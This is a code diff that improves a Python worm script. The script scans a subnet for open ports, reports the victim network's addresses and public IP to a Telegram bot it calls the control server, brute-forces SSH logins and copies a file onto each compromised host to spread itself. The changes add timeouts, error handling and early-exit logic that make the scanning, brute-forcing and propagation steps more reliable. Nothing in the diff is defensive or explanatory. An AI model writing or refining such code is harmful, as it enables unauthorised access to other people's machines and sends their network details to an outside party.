@@ -17,11 +17,15 @@ PROPAGATION
 def propagate(host,port,username,password):
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-	ssh.connect(host,port,username,password)
-	scp = sc.SCPClient(ssh.get_transport())
-	scp.put("owned.txt","~/")
-	scp.close()
-	ssh.close()
+	try:
+		ssh.connect(host,port,username,password,banner_timeout=2)
+		scp = sc.SCPClient(ssh.get_transport())
+		scp.put("owned.txt","~/")
+		scp.close()
+		ssh.close()
+	except:
+		ssh.close()
+		
 
 """
 SSH BRUTE FORCE
@@ -30,7 +34,7 @@ def connection_established(host,port,username,password):
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	try:
-		ssh.connect(host,port,username,password)
+		ssh.connect(host,port,username,password,banner_timeout=2)
 		ssh.close()
 		return True
 	except:
@@ -112,6 +116,8 @@ def calculate_subnet(host,netmask,gateway,broadcast):
 SEND FEEDBACK TO CONTROL SERVER
 """
 def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,devices_open_ports):
+
+	ret_status = 1 # meaning that there are devices on the subnet with well known ports open
 	
 	public_ip = requests.get("https://api.ipify.org").text
 	
@@ -124,6 +130,7 @@ def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,devices_open_p
 
 	if not devices_open_ports:
 		status += "All devices have no well known ports open!\n"
+		ret_status = 0 # meaning that there aren't devices on the subnet with well known ports open
 	else:
 		status += "Network I'm in:\n"
 		for elem in devices_open_ports:
@@ -131,6 +138,8 @@ def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,devices_open_p
 
 	post_req = requests.post("https://api.telegram.org/bot"+token+ \
 				  "/sendMessage",data={"chat_id":chat_id,"text":status})
+				  
+	return ret_status
 				  
 """
 DETERMINE WICH INTERFACE I'M USING
@@ -149,8 +158,6 @@ def determine_if():
 	else: return online_interfaces[0]
 
 if __name__ == "__main__":
-
-	start = t.time()
 	
 	### CHECK IF ONLINE ###
 	interface = determine_if()
@@ -176,15 +183,18 @@ if __name__ == "__main__":
 	con_file.close()
 
 	### SENDING THE INFORMATION TO THE CONTROL SERVER ###
-	send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,devices_open_ports)
+	ret_status = send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,devices_open_ports)
+	if ret_status == 0 : sys.exit("no device with wkp open, nothing to do here")
 	
 	### SSH BRUTE FORCE ###
 	ssh_targets = [elem[0] for elem in devices_open_ports if 22 in elem[1]]
+	if not ssh_targets: sys.exit("no device with ssh active, not possibile to spread")
+	
 	for target_ip in ssh_targets:
 		credentials = [ssh_brute_force(target_ip,22)]
 		
+	print(credentials)
 	### AUTO PROPAGATION ###
 	for target in credentials:
-		propagate(target[0],target[1],target[2],target[3])
-		
-	print("script took %s seconds to complete"%(t.time()-start))
+		if isinstance(target,list):
+			propagate(target[0],target[1],target[2],target[3])
